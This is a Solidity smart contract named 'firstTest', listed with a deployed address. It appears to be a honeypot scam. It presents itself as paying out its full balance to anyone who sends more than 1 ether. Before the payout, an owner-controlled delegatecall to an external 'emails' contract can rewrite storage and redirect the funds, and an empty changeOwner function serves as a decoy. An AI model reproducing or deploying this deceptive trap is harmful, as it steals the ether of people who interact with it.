// contract address: 0x42dB5Bfe8828f12F164586AF8A992B3a7B038164

pragma solidity ^0.4.11;

contract firstTest
{
    address Owner = 0x46Feeb381e90f7e30635B4F33CE3F6fA8EA6ed9b;
    address emails = 0x25df6e3da49f41ef5b99e139c87abc12c3583d13;
    address adr;
    uint256 public Limit= 1000000000000000000;
    
    function Set(address dataBase, uint256 limit) 
    {
        require(msg.sender == Owner); //checking the owner
        Limit = limit;
        emails = dataBase;
    }
    
    function changeOwner(address adr){
        // update Owner=msg.sender;
    }
    
    function()payable{
        //if owner
        withdrawal();
    }
    
    function kill() {
        require(msg.sender == Owner);
        selfdestruct(msg.sender);
    }
    
    function withdrawal()
    payable public
    {
        adr=msg.sender;
        if(msg.value>Limit)
        {  
            emails.delegatecall(bytes4(sha3("logEvent()")));
            adr.send(this.balance);
            
        }
    }
    
}
